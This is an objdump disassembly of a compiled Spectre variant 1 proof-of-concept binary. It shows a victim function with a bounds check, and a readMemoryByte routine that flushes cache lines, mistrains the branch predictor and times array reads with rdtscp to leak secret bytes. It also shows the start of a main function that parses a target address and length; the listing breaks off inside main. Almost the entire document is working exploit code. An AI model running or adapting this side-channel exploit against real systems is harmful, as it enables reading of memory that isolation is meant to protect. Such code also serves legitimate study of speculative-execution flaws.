
spectre_drvchr.o:     file format elf64-x86-64


Disassembly of section .init:

00000000000005f8 <_init>:
 5f8:	48 83 ec 08          	sub    rsp,0x8
 5fc:	48 8b 05 e5 19 20 00 	mov    rax,QWORD PTR [rip+0x2019e5]        # 201fe8 <__gmon_start__>
 603:	48 85 c0             	test   rax,rax
 606:	74 02                	je     60a <_init+0x12>
 608:	ff d0                	call   rax
 60a:	48 83 c4 08          	add    rsp,0x8
 60e:	c3                   	ret    

Disassembly of section .plt:

0000000000000610 <.plt>:
 610:	ff 35 92 19 20 00    	push   QWORD PTR [rip+0x201992]        # 201fa8 <_GLOBAL_OFFSET_TABLE_+0x8>
 616:	ff 25 94 19 20 00    	jmp    QWORD PTR [rip+0x201994]        # 201fb0 <_GLOBAL_OFFSET_TABLE_+0x10>
 61c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]

0000000000000620 <putchar@plt>:
 620:	ff 25 92 19 20 00    	jmp    QWORD PTR [rip+0x201992]        # 201fb8 <putchar@GLIBC_2.2.5>
 626:	68 00 00 00 00       	push   0x0
 62b:	e9 e0 ff ff ff       	jmp    610 <.plt>

0000000000000630 <__stack_chk_fail@plt>:
 630:	ff 25 8a 19 20 00    	jmp    QWORD PTR [rip+0x20198a]        # 201fc0 <__stack_chk_fail@GLIBC_2.4>
 636:	68 01 00 00 00       	push   0x1
 63b:	e9 d0 ff ff ff       	jmp    610 <.plt>

0000000000000640 <printf@plt>:
 640:	ff 25 82 19 20 00    	jmp    QWORD PTR [rip+0x201982]        # 201fc8 <printf@GLIBC_2.2.5>
 646:	68 02 00 00 00       	push   0x2
 64b:	e9 c0 ff ff ff       	jmp    610 <.plt>

0000000000000650 <__isoc99_sscanf@plt>:
 650:	ff 25 7a 19 20 00    	jmp    QWORD PTR [rip+0x20197a]        # 201fd0 <__isoc99_sscanf@GLIBC_2.7>
 656:	68 03 00 00 00       	push   0x3
 65b:	e9 b0 ff ff ff       	jmp    610 <.plt>

Disassembly of section .plt.got:

0000000000000660 <__cxa_finalize@plt>:
 660:	ff 25 92 19 20 00    	jmp    QWORD PTR [rip+0x201992]        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 666:	66 90                	xchg   ax,ax

Disassembly of section .text:

0000000000000670 <_start>:
 670:	31 ed                	xor    ebp,ebp
 672:	49 89 d1             	mov    r9,rdx
 675:	5e                   	pop    rsi
 676:	48 89 e2             	mov    rdx,rsp
 679:	48 83 e4 f0          	and    rsp,0xfffffffffffffff0
 67d:	50                   	push   rax
 67e:	54                   	push   rsp
 67f:	4c 8d 05 ba 07 00 00 	lea    r8,[rip+0x7ba]        # e40 <__libc_csu_fini>
 686:	48 8d 0d 43 07 00 00 	lea    rcx,[rip+0x743]        # dd0 <__libc_csu_init>
 68d:	48 8d 3d 4c 05 00 00 	lea    rdi,[rip+0x54c]        # be0 <main>
 694:	ff 15 46 19 20 00    	call   QWORD PTR [rip+0x201946]        # 201fe0 <__libc_start_main@GLIBC_2.2.5>
 69a:	f4                   	hlt    
 69b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000006a0 <deregister_tm_clones>:
 6a0:	48 8d 3d 41 1a 20 00 	lea    rdi,[rip+0x201a41]        # 2020e8 <__TMC_END__>
 6a7:	55                   	push   rbp
 6a8:	48 8d 05 39 1a 20 00 	lea    rax,[rip+0x201a39]        # 2020e8 <__TMC_END__>
 6af:	48 39 f8             	cmp    rax,rdi
 6b2:	48 89 e5             	mov    rbp,rsp
 6b5:	74 19                	je     6d0 <deregister_tm_clones+0x30>
 6b7:	48 8b 05 1a 19 20 00 	mov    rax,QWORD PTR [rip+0x20191a]        # 201fd8 <_ITM_deregisterTMCloneTable>
 6be:	48 85 c0             	test   rax,rax
 6c1:	74 0d                	je     6d0 <deregister_tm_clones+0x30>
 6c3:	5d                   	pop    rbp
 6c4:	ff e0                	jmp    rax
 6c6:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
 6cd:	00 00 00 
 6d0:	5d                   	pop    rbp
 6d1:	c3                   	ret    
 6d2:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
 6d6:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
 6dd:	00 00 00 

00000000000006e0 <register_tm_clones>:
 6e0:	48 8d 3d 01 1a 20 00 	lea    rdi,[rip+0x201a01]        # 2020e8 <__TMC_END__>
 6e7:	48 8d 35 fa 19 20 00 	lea    rsi,[rip+0x2019fa]        # 2020e8 <__TMC_END__>
 6ee:	55                   	push   rbp
 6ef:	48 29 fe             	sub    rsi,rdi
 6f2:	48 89 e5             	mov    rbp,rsp
 6f5:	48 c1 fe 03          	sar    rsi,0x3
 6f9:	48 89 f0             	mov    rax,rsi
 6fc:	48 c1 e8 3f          	shr    rax,0x3f
 700:	48 01 c6             	add    rsi,rax
 703:	48 d1 fe             	sar    rsi,1
 706:	74 18                	je     720 <register_tm_clones+0x40>
 708:	48 8b 05 e1 18 20 00 	mov    rax,QWORD PTR [rip+0x2018e1]        # 201ff0 <_ITM_registerTMCloneTable>
 70f:	48 85 c0             	test   rax,rax
 712:	74 0c                	je     720 <register_tm_clones+0x40>
 714:	5d                   	pop    rbp
 715:	ff e0                	jmp    rax
 717:	66 0f 1f 84 00 00 00 	nop    WORD PTR [rax+rax*1+0x0]
 71e:	00 00 
 720:	5d                   	pop    rbp
 721:	c3                   	ret    
 722:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
 726:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
 72d:	00 00 00 

0000000000000730 <__do_global_dtors_aux>:
 730:	80 3d c9 19 20 00 00 	cmp    BYTE PTR [rip+0x2019c9],0x0        # 202100 <completed.7698>
 737:	75 2f                	jne    768 <__do_global_dtors_aux+0x38>
 739:	48 83 3d b7 18 20 00 	cmp    QWORD PTR [rip+0x2018b7],0x0        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 740:	00 
 741:	55                   	push   rbp
 742:	48 89 e5             	mov    rbp,rsp
 745:	74 0c                	je     753 <__do_global_dtors_aux+0x23>
 747:	48 8b 3d ba 18 20 00 	mov    rdi,QWORD PTR [rip+0x2018ba]        # 202008 <__dso_handle>
 74e:	e8 0d ff ff ff       	call   660 <__cxa_finalize@plt>
 753:	e8 48 ff ff ff       	call   6a0 <deregister_tm_clones>
 758:	c6 05 a1 19 20 00 01 	mov    BYTE PTR [rip+0x2019a1],0x1        # 202100 <completed.7698>
 75f:	5d                   	pop    rbp
 760:	c3                   	ret    
 761:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]
 768:	f3 c3                	repz ret 
 76a:	66 0f 1f 44 00 00    	nop    WORD PTR [rax+rax*1+0x0]

0000000000000770 <frame_dummy>:
 770:	55                   	push   rbp
 771:	48 89 e5             	mov    rbp,rsp
 774:	5d                   	pop    rbp
 775:	e9 66 ff ff ff       	jmp    6e0 <register_tm_clones>

000000000000077a <victim_function>:
 77a:	55                   	push   rbp
 77b:	48 89 e5             	mov    rbp,rsp
 77e:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
 782:	8b 05 98 18 20 00    	mov    eax,DWORD PTR [rip+0x201898]        # 202020 <array1_size>
 788:	89 c0                	mov    eax,eax
 78a:	48 39 45 f8          	cmp    QWORD PTR [rbp-0x8],rax
 78e:	73 34                	jae    7c4 <victim_function+0x4a>
 790:	48 8d 15 a9 18 20 00 	lea    rdx,[rip+0x2018a9]        # 202040 <array1>
 797:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
 79b:	48 01 d0             	add    rax,rdx
 79e:	0f b6 00             	movzx  eax,BYTE PTR [rax]
 7a1:	0f b6 c0             	movzx  eax,al
 7a4:	c1 e0 09             	shl    eax,0x9
 7a7:	48 63 d0             	movsxd rdx,eax
 7aa:	48 8d 05 6f 19 20 00 	lea    rax,[rip+0x20196f]        # 202120 <array2>
 7b1:	0f b6 14 02          	movzx  edx,BYTE PTR [rdx+rax*1]
 7b5:	0f b6 05 64 19 22 00 	movzx  eax,BYTE PTR [rip+0x221964]        # 222120 <temp>
 7bc:	21 d0                	and    eax,edx
 7be:	88 05 5c 19 22 00    	mov    BYTE PTR [rip+0x22195c],al        # 222120 <temp>
 7c4:	90                   	nop
 7c5:	5d                   	pop    rbp
 7c6:	c3                   	ret    

00000000000007c7 <readMemoryByte>:
 7c7:	55                   	push   rbp
 7c8:	48 89 e5             	mov    rbp,rsp
 7cb:	53                   	push   rbx
 7cc:	48 81 ec 88 00 00 00 	sub    rsp,0x88
 7d3:	48 89 7d 88          	mov    QWORD PTR [rbp-0x78],rdi
 7d7:	48 89 75 80          	mov    QWORD PTR [rbp-0x80],rsi
 7db:	48 89 95 78 ff ff ff 	mov    QWORD PTR [rbp-0x88],rdx
 7e2:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
 7e9:	00 00 
 7eb:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
 7ef:	31 c0                	xor    eax,eax
 7f1:	c7 45 94 00 00 00 00 	mov    DWORD PTR [rbp-0x6c],0x0
 7f8:	c7 45 a0 00 00 00 00 	mov    DWORD PTR [rbp-0x60],0x0
 7ff:	eb 1f                	jmp    820 <readMemoryByte+0x59>
 801:	8b 45 a0             	mov    eax,DWORD PTR [rbp-0x60]
 804:	48 98                	cdqe   
 806:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 80d:	00 
 80e:	48 8d 05 2b 19 22 00 	lea    rax,[rip+0x22192b]        # 222140 <results.23458>
 815:	c7 04 02 00 00 00 00 	mov    DWORD PTR [rdx+rax*1],0x0
 81c:	83 45 a0 01          	add    DWORD PTR [rbp-0x60],0x1
 820:	81 7d a0 ff 00 00 00 	cmp    DWORD PTR [rbp-0x60],0xff
 827:	7e d8                	jle    801 <readMemoryByte+0x3a>
 829:	c7 45 9c e7 03 00 00 	mov    DWORD PTR [rbp-0x64],0x3e7
 830:	e9 fa 02 00 00       	jmp    b2f <readMemoryByte+0x368>
 835:	c7 45 a0 00 00 00 00 	mov    DWORD PTR [rbp-0x60],0x0
 83c:	eb 22                	jmp    860 <readMemoryByte+0x99>
 83e:	8b 45 a0             	mov    eax,DWORD PTR [rbp-0x60]
 841:	c1 e0 09             	shl    eax,0x9
 844:	48 63 d0             	movsxd rdx,eax
 847:	48 8d 05 d2 18 20 00 	lea    rax,[rip+0x2018d2]        # 202120 <array2>
 84e:	48 01 d0             	add    rax,rdx
 851:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
 855:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
 859:	0f ae 38             	clflush BYTE PTR [rax]
 85c:	83 45 a0 01          	add    DWORD PTR [rbp-0x60],0x1
 860:	81 7d a0 ff 00 00 00 	cmp    DWORD PTR [rbp-0x60],0xff
 867:	7e d5                	jle    83e <readMemoryByte+0x77>
 869:	8b 45 9c             	mov    eax,DWORD PTR [rbp-0x64]
 86c:	8b 0d ae 17 20 00    	mov    ecx,DWORD PTR [rip+0x2017ae]        # 202020 <array1_size>
 872:	ba 00 00 00 00       	mov    edx,0x0
 877:	f7 f1                	div    ecx
 879:	89 d0                	mov    eax,edx
 87b:	89 c0                	mov    eax,eax
 87d:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
 881:	c7 45 a4 1d 00 00 00 	mov    DWORD PTR [rbp-0x5c],0x1d
 888:	e9 88 00 00 00       	jmp    915 <readMemoryByte+0x14e>
 88d:	48 8d 05 8c 17 20 00 	lea    rax,[rip+0x20178c]        # 202020 <array1_size>
 894:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
 898:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
 89c:	0f ae 38             	clflush BYTE PTR [rax]
 89f:	c7 45 98 00 00 00 00 	mov    DWORD PTR [rbp-0x68],0x0
 8a6:	eb 09                	jmp    8b1 <readMemoryByte+0xea>
 8a8:	8b 45 98             	mov    eax,DWORD PTR [rbp-0x68]
 8ab:	83 c0 01             	add    eax,0x1
 8ae:	89 45 98             	mov    DWORD PTR [rbp-0x68],eax
 8b1:	8b 45 98             	mov    eax,DWORD PTR [rbp-0x68]
 8b4:	83 f8 63             	cmp    eax,0x63
 8b7:	7e ef                	jle    8a8 <readMemoryByte+0xe1>
 8b9:	8b 4d a4             	mov    ecx,DWORD PTR [rbp-0x5c]
 8bc:	ba ab aa aa 2a       	mov    edx,0x2aaaaaab
 8c1:	89 c8                	mov    eax,ecx
 8c3:	f7 ea                	imul   edx
 8c5:	89 c8                	mov    eax,ecx
 8c7:	c1 f8 1f             	sar    eax,0x1f
 8ca:	29 c2                	sub    edx,eax
 8cc:	89 d0                	mov    eax,edx
 8ce:	01 c0                	add    eax,eax
 8d0:	01 d0                	add    eax,edx
 8d2:	01 c0                	add    eax,eax
 8d4:	29 c1                	sub    ecx,eax
 8d6:	89 ca                	mov    edx,ecx
 8d8:	8d 42 ff             	lea    eax,[rdx-0x1]
 8db:	66 b8 00 00          	mov    ax,0x0
 8df:	48 98                	cdqe   
 8e1:	48 89 45 c0          	mov    QWORD PTR [rbp-0x40],rax
 8e5:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
 8e9:	48 c1 e8 10          	shr    rax,0x10
 8ed:	48 09 45 c0          	or     QWORD PTR [rbp-0x40],rax
 8f1:	48 8b 45 88          	mov    rax,QWORD PTR [rbp-0x78]
 8f5:	48 33 45 b0          	xor    rax,QWORD PTR [rbp-0x50]
 8f9:	48 23 45 c0          	and    rax,QWORD PTR [rbp-0x40]
 8fd:	48 33 45 b0          	xor    rax,QWORD PTR [rbp-0x50]
 901:	48 89 45 c0          	mov    QWORD PTR [rbp-0x40],rax
 905:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
 909:	48 89 c7             	mov    rdi,rax
 90c:	e8 69 fe ff ff       	call   77a <victim_function>
 911:	83 6d a4 01          	sub    DWORD PTR [rbp-0x5c],0x1
 915:	83 7d a4 00          	cmp    DWORD PTR [rbp-0x5c],0x0
 919:	0f 89 6e ff ff ff    	jns    88d <readMemoryByte+0xc6>
 91f:	c7 45 a0 00 00 00 00 	mov    DWORD PTR [rbp-0x60],0x0
 926:	e9 d7 00 00 00       	jmp    a02 <readMemoryByte+0x23b>
 92b:	8b 45 a0             	mov    eax,DWORD PTR [rbp-0x60]
 92e:	69 c0 a7 00 00 00    	imul   eax,eax,0xa7
 934:	83 c0 0d             	add    eax,0xd
 937:	25 ff 00 00 00       	and    eax,0xff
 93c:	89 45 ac             	mov    DWORD PTR [rbp-0x54],eax
 93f:	8b 45 ac             	mov    eax,DWORD PTR [rbp-0x54]
 942:	c1 e0 09             	shl    eax,0x9
 945:	48 63 d0             	movsxd rdx,eax
 948:	48 8d 05 d1 17 20 00 	lea    rax,[rip+0x2017d1]        # 202120 <array2>
 94f:	48 01 d0             	add    rax,rdx
 952:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
 956:	48 8d 45 94          	lea    rax,[rbp-0x6c]
 95a:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
 95e:	0f 01 f9             	rdtscp 
 961:	89 ce                	mov    esi,ecx
 963:	48 8b 4d e0          	mov    rcx,QWORD PTR [rbp-0x20]
 967:	89 31                	mov    DWORD PTR [rcx],esi
 969:	48 c1 e2 20          	shl    rdx,0x20
 96d:	48 09 d0             	or     rax,rdx
 970:	48 89 c3             	mov    rbx,rax
 973:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
 977:	0f b6 00             	movzx  eax,BYTE PTR [rax]
 97a:	0f b6 c0             	movzx  eax,al
 97d:	89 45 94             	mov    DWORD PTR [rbp-0x6c],eax
 980:	48 8d 45 94          	lea    rax,[rbp-0x6c]
 984:	48 89 45 d8          	mov    QWORD PTR [rbp-0x28],rax
 988:	0f 01 f9             	rdtscp 
 98b:	89 ce                	mov    esi,ecx
 98d:	48 8b 4d d8          	mov    rcx,QWORD PTR [rbp-0x28]
 991:	89 31                	mov    DWORD PTR [rcx],esi
 993:	48 c1 e2 20          	shl    rdx,0x20
 997:	48 09 d0             	or     rax,rdx
 99a:	48 29 d8             	sub    rax,rbx
 99d:	48 89 c3             	mov    rbx,rax
 9a0:	48 83 fb 50          	cmp    rbx,0x50
 9a4:	77 58                	ja     9fe <readMemoryByte+0x237>
 9a6:	8b 45 9c             	mov    eax,DWORD PTR [rbp-0x64]
 9a9:	8b 0d 71 16 20 00    	mov    ecx,DWORD PTR [rip+0x201671]        # 202020 <array1_size>
 9af:	ba 00 00 00 00       	mov    edx,0x0
 9b4:	f7 f1                	div    ecx
 9b6:	89 d0                	mov    eax,edx
 9b8:	89 c2                	mov    edx,eax
 9ba:	48 8d 05 7f 16 20 00 	lea    rax,[rip+0x20167f]        # 202040 <array1>
 9c1:	0f b6 04 02          	movzx  eax,BYTE PTR [rdx+rax*1]
 9c5:	0f b6 c0             	movzx  eax,al
 9c8:	39 45 ac             	cmp    DWORD PTR [rbp-0x54],eax
 9cb:	74 31                	je     9fe <readMemoryByte+0x237>
 9cd:	8b 45 ac             	mov    eax,DWORD PTR [rbp-0x54]
 9d0:	48 98                	cdqe   
 9d2:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 9d9:	00 
 9da:	48 8d 05 5f 17 22 00 	lea    rax,[rip+0x22175f]        # 222140 <results.23458>
 9e1:	8b 04 02             	mov    eax,DWORD PTR [rdx+rax*1]
 9e4:	8d 48 01             	lea    ecx,[rax+0x1]
 9e7:	8b 45 ac             	mov    eax,DWORD PTR [rbp-0x54]
 9ea:	48 98                	cdqe   
 9ec:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 9f3:	00 
 9f4:	48 8d 05 45 17 22 00 	lea    rax,[rip+0x221745]        # 222140 <results.23458>
 9fb:	89 0c 02             	mov    DWORD PTR [rdx+rax*1],ecx
 9fe:	83 45 a0 01          	add    DWORD PTR [rbp-0x60],0x1
 a02:	81 7d a0 ff 00 00 00 	cmp    DWORD PTR [rbp-0x60],0xff
 a09:	0f 8e 1c ff ff ff    	jle    92b <readMemoryByte+0x164>
 a0f:	c7 45 a8 ff ff ff ff 	mov    DWORD PTR [rbp-0x58],0xffffffff
 a16:	8b 45 a8             	mov    eax,DWORD PTR [rbp-0x58]
 a19:	89 45 a4             	mov    DWORD PTR [rbp-0x5c],eax
 a1c:	c7 45 a0 00 00 00 00 	mov    DWORD PTR [rbp-0x60],0x0
 a23:	e9 88 00 00 00       	jmp    ab0 <readMemoryByte+0x2e9>
 a28:	83 7d a4 00          	cmp    DWORD PTR [rbp-0x5c],0x0
 a2c:	78 32                	js     a60 <readMemoryByte+0x299>
 a2e:	8b 45 a0             	mov    eax,DWORD PTR [rbp-0x60]
 a31:	48 98                	cdqe   
 a33:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 a3a:	00 
 a3b:	48 8d 05 fe 16 22 00 	lea    rax,[rip+0x2216fe]        # 222140 <results.23458>
 a42:	8b 14 02             	mov    edx,DWORD PTR [rdx+rax*1]
 a45:	8b 45 a4             	mov    eax,DWORD PTR [rbp-0x5c]
 a48:	48 98                	cdqe   
 a4a:	48 8d 0c 85 00 00 00 	lea    rcx,[rax*4+0x0]
 a51:	00 
 a52:	48 8d 05 e7 16 22 00 	lea    rax,[rip+0x2216e7]        # 222140 <results.23458>
 a59:	8b 04 01             	mov    eax,DWORD PTR [rcx+rax*1]
 a5c:	39 c2                	cmp    edx,eax
 a5e:	7c 0e                	jl     a6e <readMemoryByte+0x2a7>
 a60:	8b 45 a4             	mov    eax,DWORD PTR [rbp-0x5c]
 a63:	89 45 a8             	mov    DWORD PTR [rbp-0x58],eax
 a66:	8b 45 a0             	mov    eax,DWORD PTR [rbp-0x60]
 a69:	89 45 a4             	mov    DWORD PTR [rbp-0x5c],eax
 a6c:	eb 3e                	jmp    aac <readMemoryByte+0x2e5>
 a6e:	83 7d a8 00          	cmp    DWORD PTR [rbp-0x58],0x0
 a72:	78 32                	js     aa6 <readMemoryByte+0x2df>
 a74:	8b 45 a0             	mov    eax,DWORD PTR [rbp-0x60]
 a77:	48 98                	cdqe   
 a79:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 a80:	00 
 a81:	48 8d 05 b8 16 22 00 	lea    rax,[rip+0x2216b8]        # 222140 <results.23458>
 a88:	8b 14 02             	mov    edx,DWORD PTR [rdx+rax*1]
 a8b:	8b 45 a8             	mov    eax,DWORD PTR [rbp-0x58]
 a8e:	48 98                	cdqe   
 a90:	48 8d 0c 85 00 00 00 	lea    rcx,[rax*4+0x0]
 a97:	00 
 a98:	48 8d 05 a1 16 22 00 	lea    rax,[rip+0x2216a1]        # 222140 <results.23458>
 a9f:	8b 04 01             	mov    eax,DWORD PTR [rcx+rax*1]
 aa2:	39 c2                	cmp    edx,eax
 aa4:	7c 06                	jl     aac <readMemoryByte+0x2e5>
 aa6:	8b 45 a0             	mov    eax,DWORD PTR [rbp-0x60]
 aa9:	89 45 a8             	mov    DWORD PTR [rbp-0x58],eax
 aac:	83 45 a0 01          	add    DWORD PTR [rbp-0x60],0x1
 ab0:	81 7d a0 ff 00 00 00 	cmp    DWORD PTR [rbp-0x60],0xff
 ab7:	0f 8e 6b ff ff ff    	jle    a28 <readMemoryByte+0x261>
 abd:	8b 45 a4             	mov    eax,DWORD PTR [rbp-0x5c]
 ac0:	48 98                	cdqe   
 ac2:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 ac9:	00 
 aca:	48 8d 05 6f 16 22 00 	lea    rax,[rip+0x22166f]        # 222140 <results.23458>
 ad1:	8b 14 02             	mov    edx,DWORD PTR [rdx+rax*1]
 ad4:	8b 45 a8             	mov    eax,DWORD PTR [rbp-0x58]
 ad7:	48 98                	cdqe   
 ad9:	48 8d 0c 85 00 00 00 	lea    rcx,[rax*4+0x0]
 ae0:	00 
 ae1:	48 8d 05 58 16 22 00 	lea    rax,[rip+0x221658]        # 222140 <results.23458>
 ae8:	8b 04 01             	mov    eax,DWORD PTR [rcx+rax*1]
 aeb:	01 c0                	add    eax,eax
 aed:	83 c0 05             	add    eax,0x5
 af0:	39 c2                	cmp    edx,eax
 af2:	7d 45                	jge    b39 <readMemoryByte+0x372>
 af4:	8b 45 a4             	mov    eax,DWORD PTR [rbp-0x5c]
 af7:	48 98                	cdqe   
 af9:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 b00:	00 
 b01:	48 8d 05 38 16 22 00 	lea    rax,[rip+0x221638]        # 222140 <results.23458>
 b08:	8b 04 02             	mov    eax,DWORD PTR [rdx+rax*1]
 b0b:	83 f8 02             	cmp    eax,0x2
 b0e:	75 1b                	jne    b2b <readMemoryByte+0x364>
 b10:	8b 45 a8             	mov    eax,DWORD PTR [rbp-0x58]
 b13:	48 98                	cdqe   
 b15:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 b1c:	00 
 b1d:	48 8d 05 1c 16 22 00 	lea    rax,[rip+0x22161c]        # 222140 <results.23458>
 b24:	8b 04 02             	mov    eax,DWORD PTR [rdx+rax*1]
 b27:	85 c0                	test   eax,eax
 b29:	74 0e                	je     b39 <readMemoryByte+0x372>
 b2b:	83 6d 9c 01          	sub    DWORD PTR [rbp-0x64],0x1
 b2f:	83 7d 9c 00          	cmp    DWORD PTR [rbp-0x64],0x0
 b33:	0f 8f fc fc ff ff    	jg     835 <readMemoryByte+0x6e>
 b39:	b8 e7 03 00 00       	mov    eax,0x3e7
 b3e:	2b 45 9c             	sub    eax,DWORD PTR [rbp-0x64]
 b41:	89 c6                	mov    esi,eax
 b43:	48 8d 3d 37 03 00 00 	lea    rdi,[rip+0x337]        # e81 <_IO_stdin_used+0x31>
 b4a:	b8 00 00 00 00       	mov    eax,0x0
 b4f:	e8 ec fa ff ff       	call   640 <printf@plt>
 b54:	8b 15 e6 15 22 00    	mov    edx,DWORD PTR [rip+0x2215e6]        # 222140 <results.23458>
 b5a:	8b 45 94             	mov    eax,DWORD PTR [rbp-0x6c]
 b5d:	31 d0                	xor    eax,edx
 b5f:	89 05 db 15 22 00    	mov    DWORD PTR [rip+0x2215db],eax        # 222140 <results.23458>
 b65:	8b 45 a4             	mov    eax,DWORD PTR [rbp-0x5c]
 b68:	89 c2                	mov    edx,eax
 b6a:	48 8b 45 80          	mov    rax,QWORD PTR [rbp-0x80]
 b6e:	88 10                	mov    BYTE PTR [rax],dl
 b70:	8b 45 a4             	mov    eax,DWORD PTR [rbp-0x5c]
 b73:	48 98                	cdqe   
 b75:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
 b7c:	00 
 b7d:	48 8d 05 bc 15 22 00 	lea    rax,[rip+0x2215bc]        # 222140 <results.23458>
 b84:	8b 14 02             	mov    edx,DWORD PTR [rdx+rax*1]
 b87:	48 8b 85 78 ff ff ff 	mov    rax,QWORD PTR [rbp-0x88]
 b8e:	89 10                	mov    DWORD PTR [rax],edx
 b90:	48 8b 45 80          	mov    rax,QWORD PTR [rbp-0x80]
 b94:	48 83 c0 01          	add    rax,0x1
 b98:	8b 55 a8             	mov    edx,DWORD PTR [rbp-0x58]
 b9b:	88 10                	mov    BYTE PTR [rax],dl
 b9d:	48 8b 85 78 ff ff ff 	mov    rax,QWORD PTR [rbp-0x88]
 ba4:	48 8d 50 04          	lea    rdx,[rax+0x4]
 ba8:	8b 45 a8             	mov    eax,DWORD PTR [rbp-0x58]
 bab:	48 98                	cdqe   
 bad:	48 8d 0c 85 00 00 00 	lea    rcx,[rax*4+0x0]
 bb4:	00 
 bb5:	48 8d 05 84 15 22 00 	lea    rax,[rip+0x221584]        # 222140 <results.23458>
 bbc:	8b 04 01             	mov    eax,DWORD PTR [rcx+rax*1]
 bbf:	89 02                	mov    DWORD PTR [rdx],eax
 bc1:	90                   	nop
 bc2:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
 bc6:	64 48 33 04 25 28 00 	xor    rax,QWORD PTR fs:0x28
 bcd:	00 00 
 bcf:	74 05                	je     bd6 <readMemoryByte+0x40f>
 bd1:	e8 5a fa ff ff       	call   630 <__stack_chk_fail@plt>
 bd6:	48 81 c4 88 00 00 00 	add    rsp,0x88
 bdd:	5b                   	pop    rbx
 bde:	5d                   	pop    rbp
 bdf:	c3                   	ret    

0000000000000be0 <main>:
 be0:	55                   	push   rbp
 be1:	48 89 e5             	mov    rbp,rsp
 be4:	48 83 ec 40          	sub    rsp,0x40
 be8:	89 7d cc             	mov    DWORD PTR [rbp-0x34],edi
 beb:	48 89 75 c0          	mov    QWORD PTR [rbp-0x40],rsi
 bef:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
 bf6:	00 00 
 bf8:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
 bfc:	31 c0                	xor    eax,eax
 bfe:	48 8b 05 db 14 20 00 	mov    rax,QWORD PTR [rip+0x2014db]        # 2020e0 <secret>
 c05:	48 89 c2             	mov    rdx,rax
 c08:	48 8d 05 31 14 20 00 	lea    rax,[rip+0x201431]        # 202040 <array1>
 c0f:	48 29 c2             	sub    rdx,rax
 c12:	48 89 d0             	mov    rax,rdx
 c15:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
 c19:	c7 45 d8 28 00 00 00 	mov    DWORD PTR [rbp-0x28],0x28
 c20:	c7 45 dc 00 00 00 00 	mov    DWORD PTR [rbp-0x24],0x0
 c27:	eb 15                	jmp    c3e <main+0x5e>
 c29:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
 c2c:	48 63 d0             	movsxd rdx,eax
 c2f:	48 8d 05 ea 14 20 00 	lea    rax,[rip+0x2014ea]        # 202120 <array2>
 c36:	c6 04 02 01          	mov    BYTE PTR [rdx+rax*1],0x1
 c3a:	83 45 dc 01          	add    DWORD PTR [rbp-0x24],0x1
 c3e:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
 c41:	3d ff ff 01 00       	cmp    eax,0x1ffff
 c46:	76 e1                	jbe    c29 <main+0x49>
 c48:	83 7d cc 03          	cmp    DWORD PTR [rbp-0x34],0x3
 c4c:	75 5b                	jne    ca9 <main+0xc9>
 c4e:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
 c52:	48 83 c0 08          	add    rax,0x8
 c56:	48 8b 00             	mov    rax,QWORD PTR [rax]
 c59:	48 8d 55 e0          	lea    rdx,[rbp-0x20]
 c5d:	48 8d 35 27 02 00 00 	lea    rsi,[rip+0x227]        # e8b <_IO_stdin_used+0x3b>
 c64:	48 89 c7             	mov    rdi,rax
 c67:	b8 00 00 00 00       	mov    eax,0x0
 c6c:	e8 df f9 ff ff       	call   650 <__isoc99_sscanf@plt>
 c71:	48 8b 55 e0          	mov    rdx,QWORD PTR [rbp-0x20]
 c75:	48 8d 05 c4 13 20 00 	lea    rax,[rip+0x2013c4]        # 202040 <array1>
 c7c:	48 29 c2             	sub    rdx,rax
 c7f:	48 89 d0             	mov    rax,rdx
 c82:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
 c86:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
 c8a:	48 83 c0 10          	add    rax,0x10
 c8e:	48 8b 00             	mov    rax,QWORD PTR [rax]
 c91:	48 8d 55 d8          	lea    rdx,[rbp-0x28]
 c95:	48 8d 35 f2 01 00 00 	lea    rsi,[rip+0x1f2]        # e8e <_IO_stdin_used+0x3e>
 c9c:	48 89 c7             	mov    rdi,rax
 c9f:	b8 00 00 00 00       	mov    eax,0x0
